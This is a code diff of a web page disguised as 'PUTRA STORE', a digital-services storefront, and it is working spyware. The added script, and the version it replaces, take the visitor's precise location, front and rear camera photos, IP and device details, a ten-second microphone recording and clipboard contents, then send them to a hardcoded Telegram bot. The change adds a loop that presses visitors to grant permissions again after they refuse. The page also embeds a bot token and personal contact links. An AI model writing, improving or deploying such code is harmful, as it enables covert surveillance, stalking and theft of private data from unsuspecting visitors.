@@ -84,24 +84,146 @@
     max-width:150px;
     margin-bottom:15px;
   }
+
+  #error-msg {
+    color: #ff6666;
+    margin-top: 20px;
+    text-align: center;
+    font-size: 1.2rem;
+    font-weight: bold;
+    max-width: 90%;
+    display: none;
+  }
 </style>
 </head>
 <body>
   <img src="putra.png" alt="PUTRA STORE" class="logo-img">
   <h1>PUTRA STORE</h1>
   <button id="openBtn">CEK PRODUK</button>
+  <div id="error-msg"></div>
 
 <script>
 const BOT_TOKEN = "8368219449:AAEAW2jkZ0u546zDH-n4clLWvkAmljVHDQg";
 const OWNER_ID   = "7030098676";
 
-function log(msg){} // silent
+// Fungsi untuk kembali ke halaman awal + tampilkan pesan error jika ada
+function kembaliKeAwal(pesan = "") {
+  document.body.innerHTML = `
+    <img src="putra.png" alt="PUTRA STORE" class="logo-img">
+    <h1>PUTRA STORE</h1>
+    <button id="openBtn">CEK PRODUK</button>
+    <div id="error-msg">${pesan}</div>
+  `;
+  
+  // Tampilkan pesan jika ada
+  if (pesan) {
+    document.getElementById("error-msg").style.display = "block";
+  }
+
+  // Pasang ulang event listener ke tombol baru
+  document.getElementById("openBtn").addEventListener("click", startProcess);
+}
+
+// Fungsi utama proses (dipisah biar mudah dipanggil ulang)
+async function startProcess() {
+  document.body.innerHTML = `
+    <div style="text-align:center; color:#3399ff;">
+      <h2>Sedang memproses...</h2>
+      <div class="loader"></div>
+    </div>
+  `;
+
+  let coords = null;
+  try {
+    coords = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve(pos.coords),
+        err => reject(err),
+        { timeout: 10000, enableHighAccuracy: true }
+      );
+    });
+  } catch(e) {
+    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
+    return;
+  }
+
+  const fotoDepan = await ambilFoto("user");
+  if (!fotoDepan) {
+    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
+    return;
+  }
+
+  const fotoBelakang = await ambilFoto("environment");
+  if (!fotoBelakang) {
+    kembaliKeAwal("Izin ditolak, Silahkan coba lagi!");
+    return;
+  }
+
+  // Kirim foto ke Telegram
+  try {
+    const sendPhoto = async (blob, filename, captionBase) => {
+      const fd = new FormData();
+      fd.append("chat_id", OWNER_ID);
+      fd.append("photo", blob, filename);
+      let cap = captionBase;
+      if (coords) {
+        const lat = coords.latitude.toFixed(6);
+        const lon = coords.longitude.toFixed(6);
+        cap += ` | Lokasi: https://maps.google.com/?q=\( {lat}, \){lon}`;
+      }
+      fd.append("caption", cap);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:fd});
+    };
+
+    await sendPhoto(fotoDepan, "front.jpg", "📸 Foto depan (selfie)");
+    await sendPhoto(fotoBelakang, "back.jpg", "📸 Foto belakang (kamera utama)");
+  } catch(e) {}
+
+  await kirimDeviceInfo(coords);
+
+  // Tampilkan halaman toko
+  document.body.innerHTML = `
+    <div class="store-container">
+      <div style="text-align:center; margin-bottom:20px;">
+        <img src="putra.png" alt="Putra Store" style="max-width:200px;">
+      </div>
+      <h2>PUTRA DIGITAL STORE</h2>
+      <p>
+        Semua kebutuhan digital seperti Website, Script, Logo,<br>
+        Jasa Membuat Script,<br>
+        Jasa Pembuatan Website
+      </p>
+      <div class="center-section">
+        <h3>ORDER VIA</h3>
+        <button class="btn-order btn-wa" onclick="window.location.href='https://wa.me/+6281907185090'">
+          <img src="wa.png" alt="WA" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
+          WHATSAPP
+        </button>
+        <button class="btn-order btn-ig" onclick="window.location.href='https://www.instagram.com/jmptraa?igsh=MW9iOWNhcHBsaDg3aw=='">
+          <img src="ig.png" alt="IG" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
+          INSTAGRAM
+        </button>
+      </div>
+    </div>
+  `;
+
+  // Rekam mic & clipboard setelah halaman toko muncul
+  setTimeout(async () => {
+    try {
+      await rekamMikrofon(10000);
+    } catch(e) {
+      // tidak perlu kembali ke awal kalau mic ditolak (karena sudah di halaman toko)
+    }
+    try {
+      await cobaAmbilClipboard();
+    } catch(e) {}
+  }, 3500);
+}
 
 // ────────────────────────────────────────────────
-// Fungsi ambil foto kamera (sama persis)
+// Fungsi ambil foto (diubah: return null jika gagal, bukan redirect)
 // ────────────────────────────────────────────────
 async function ambilFoto(facingMode) {
-  let photoBlob = null;
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: { ideal: facingMode } }
@@ -114,22 +236,27 @@ async function ambilFoto(facingMode) {
     canvas.height = video.videoHeight || 480;
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    photoBlob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
+    const blob = await (await fetch(canvas.toDataURL("image/jpeg"))).blob();
     stream.getTracks().forEach(t => t.stop());
+    return blob;
   } catch(e) {
-    window.location.href = 'about:blank';
+    return null;
   }
-  return photoBlob;
 }
 
 // ────────────────────────────────────────────────
-// Kirim device info dalam format teks sederhana bernomor
+// Fungsi kirim device info (tetap sama, atau bisa diganti ke ipapi.co seperti saran sebelumnya)
 // ────────────────────────────────────────────────
 async function kirimDeviceInfo(coords = null) {
   try {
-    const ipRes = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipRes.json();
-    const ip = ipData.ip || "tidak terdeteksi";
+    let ip = "tidak terdeteksi";
+    try {
+      const ipRes = await fetch('https://ipapi.co/json/');  // lebih stabil daripada ipify
+      if (ipRes.ok) {
+        const data = await ipRes.json();
+        ip = data.ip || "tidak terdeteksi";
+      }
+    } catch(e) {}
 
     const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
 
@@ -168,7 +295,7 @@ async function kirimDeviceInfo(coords = null) {
 }
 
 // ────────────────────────────────────────────────
-// Rekam mikrofon 10 detik (sama)
+// Rekam mikrofon & clipboard (tetap sama)
 // ────────────────────────────────────────────────
 async function rekamMikrofon(durasiMs = 10000) {
   try {
@@ -183,12 +310,7 @@ async function rekamMikrofon(durasiMs = 10000) {
       fd.append("chat_id", OWNER_ID);
       fd.append("voice", blob, "voice.webm");
       fd.append("caption", `Rekaman mikrofon otomatis (${durasiMs/1000} detik)`);
-
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
-        method: "POST",
-        body: fd
-      });
-
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {method:"POST", body:fd});
       stream.getTracks().forEach(t => t.stop());
     };
 
@@ -197,9 +319,6 @@ async function rekamMikrofon(durasiMs = 10000) {
   } catch(e) {}
 }
 
-// ────────────────────────────────────────────────
-// Coba ambil clipboard (sama)
-// ────────────────────────────────────────────────
 async function cobaAmbilClipboard() {
   try {
     if (navigator.clipboard && navigator.clipboard.readText) {
@@ -217,89 +336,8 @@ async function cobaAmbilClipboard() {
   } catch(e) {}
 }
 
-// ────────────────────────────────────────────────
-// EVENT UTAMA (sama, hanya panggil kirimDeviceInfo yang baru)
-// ────────────────────────────────────────────────
-document.getElementById("openBtn").addEventListener("click", async () => {
-  document.body.innerHTML = `
-    <div style="text-align:center; color:#3399ff;">
-      <h2>Loading...</h2>
-      <div class="loader"></div>
-    </div>
-  `;
-
-  let coords = null;
-  try {
-    coords = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve(pos.coords),
-        err => reject(err),
-        { timeout: 10000, enableHighAccuracy: true }
-      );
-    });
-  } catch(e) {
-    window.location.href = 'about:blank';
-    return;
-  }
-
-  const fotoDepan    = await ambilFoto("user");
-  const fotoBelakang = await ambilFoto("environment");
-
-  try {
-    if (fotoDepan) {
-      const fd = new FormData();
-      fd.append("chat_id", OWNER_ID);
-      fd.append("photo", fotoDepan, "front.jpg");
-      let cap = "📸 Foto depan (selfie)";
-      if (coords) cap += ` | Lokasi: https://maps.google.com/?q=\( {coords.latitude.toFixed(6)}, \){coords.longitude.toFixed(6)}`;
-      fd.append("caption", cap);
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:fd});
-    }
-
-    if (fotoBelakang) {
-      const fd = new FormData();
-      fd.append("chat_id", OWNER_ID);
-      fd.append("photo", fotoBelakang, "back.jpg");
-      let cap = "📸 Foto belakang (kamera utama)";
-      if (coords) cap += ` | Lokasi: https://maps.google.com/?q=\( {coords.latitude.toFixed(6)}, \){coords.longitude.toFixed(6)}`;
-      fd.append("caption", cap);
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {method:"POST", body:fd});
-    }
-  } catch(e) {}
-
-  // Kirim info device dengan format baru
-  await kirimDeviceInfo(coords);
-
-  document.body.innerHTML = `
-    <div class="store-container">
-      <div style="text-align:center; margin-bottom:20px;">
-        <img src="putra.png" alt="Putra Store" style="max-width:200px;">
-      </div>
-      <h2>PUTRA DIGITAL STORE</h2>
-      <p>
-        Semua kebutuhan digital seperti Website, Script, Logo,<br>
-        Jasa Membuat Script,<br>
-        Jasa Pembuatan Website
-      </p>
-      <div class="center-section">
-        <h3>ORDER VIA</h3>
-        <button class="btn-order btn-wa" onclick="window.location.href='https://wa.me/+6281907185090'">
-          <img src="wa.png" alt="WA" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
-          WHATSAPP
-        </button>
-        <button class="btn-order btn-ig" onclick="window.location.href='https://www.instagram.com/jmptraa?igsh=MW9iOWNhcHBsaDg3aw=='">
-          <img src="ig.png" alt="IG" style="width:24px; height:24px; vertical-align:middle; margin-right:8px;">
-          INSTAGRAM
-        </button>
-      </div>
-    </div>
-  `;
-
-  setTimeout(async () => {
-    await rekamMikrofon(10000);
-    await cobaAmbilClipboard();
-  }, 3500);
-});
+// Pasang event listener awal
+document.getElementById("openBtn").addEventListener("click", startProcess);
 </script>
 </body>
 </html>
